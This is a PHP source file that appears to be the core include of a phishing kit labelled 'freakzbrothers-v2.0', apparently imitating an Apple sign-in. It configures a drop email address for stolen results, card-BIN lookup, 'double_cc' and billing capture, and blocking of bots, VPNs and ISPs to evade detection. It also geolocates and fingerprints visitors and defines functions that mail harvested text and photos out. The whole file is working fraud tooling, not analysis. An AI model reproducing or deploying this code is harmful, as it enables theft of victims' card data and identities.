<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
$randomnumber = rand(1, 100);
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
$config = array(
    'email_result' => 'tamamoko12@outlook.com',
    'sender_mail' => 'freakzbrothers-v2.0-$randomnumber@freakz.site',
    'site_parameter' => 'apsignin',
    'site_password' => 'apsignin',
    'site_param_on' => 'on',
    'site_pass_on' => '',
    'send_login' => 'ON',
    'antibot.pw' => 'Noi',
    'double_cc' => 'Yes',
    'get_billing' => 'on',
    'get_bank' => 'Nops',
    'get_email' => 'TIDAK',
    'get_photo' => 'Nos',
    'onetime' => 'YES',
    'style' => 'locked',
    'block_host' => 'on',
    'block_ua' => 'on',
    'block_iprange' => 'on',
    'block_isp' => 'on',
    'block_vpn' => 'on',
    'block_referral' => 'on'
);
$result = $config['email_result'];
$sendlog = $config['send_login'];
$style = $config['style'];
$onetime = $config['onetime'];
$get_bank = $config['get_bank'];
$email_access = $config['get_email'];
$parameter = $config['site_parameter'];
$proxyblock = $config['block_vpn'];
$ispblock = $config['block_isp'];
$double_cc = $config['double_cc'];
function check_bin($bin) {
      $bin = preg_replace('/\s/', '', $bin);
      $bin = substr($bin,0,8);
      $url = "https://lookup.binlist.net/".$bin;
      $headersers = array();
      $headersers[] = 'Accept-Version: 3';
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
      $resp=curl_exec($ch);
      curl_close($ch);
      $result = json_decode($resp, true);
      return $result;
}
function check_carrier($phone) {
      $key = '2829d1c532dea3a97edeb498e9275f69';
      $ch = curl_init('http://apilayer.net/api/validate?access_key='.$key.'&number='.$phone.'');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $json = curl_exec($ch);
      curl_close($ch);
      $Result = json_decode($json, true);
      return $Result;
}
function kirim_mail($to, $from, $subject, $message) {
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $fromemail = $config['sender_mail'];
     $headers = "Content-type:text/plain;charset=UTF-8\r\n";
     $headers .= "From: ".$from." <".$fromemail.">" . "\r\n";
     mail($to,$subject,$message,$headers);
}

function kirim_foto($to, $from, $subject, $foto) {
     $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
     $fromemail = $config['sender_mail'];
     $content = file_get_contents($foto);
     $content = chunk_split(base64_encode($content));
     $uid = md5(uniqid(time()));
     $filename = basename($foto);
     $headers = "From: PAP ID <".$config['sender_mail'].">" . "\r\n";
     $headers .= "MIME-Version: 1.0\r\n";
     $headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";

     $message = "--".$uid."\r\n";
     $message .= "Content-type:text/plain; charset=iso-8859-1\r\n";
     $message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
     $message .= $message."\r\n\r\n";
     $message .= "--".$uid."\r\n";
     $message .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
     $message .= "Content-Transfer-Encoding: base64\r\n";
     $message .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
     $message .= $content."\r\n\r\n";
     $message .= "--".$uid."--";
     mail($to,$subject,$message,$headers);
}
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

$ip2 = getUserIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}

$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}
function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$details = get_ip1($ip2);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$cn = $countryname;
$cid = $countrycode;
$continent = $details['geoplugin_continentName'];
$citykota = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$kurenci = $details['geoplugin_currencySymbol_UTF8'];

if($countryname == "") {
    $details = get_ip2($ip2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $cn = $countryname;
    $cid = $countrycode;
    $continent = $details['continent'];
    $citykota = $details['city'];
}
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   getOS();

function getBrowser() {
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function getisp($ip) {
    $getip = 'http://extreme-ip-lookup.com/json/' . $ip;
    $curl     = curl_init();
    curl_setopt($curl, CURLOPT_URL, $getip);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    $details   = json_decode($content);
    return $details->org;
}
$br        =   getBrowser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$key = sha1(base64_encode($ip2.$user_agent));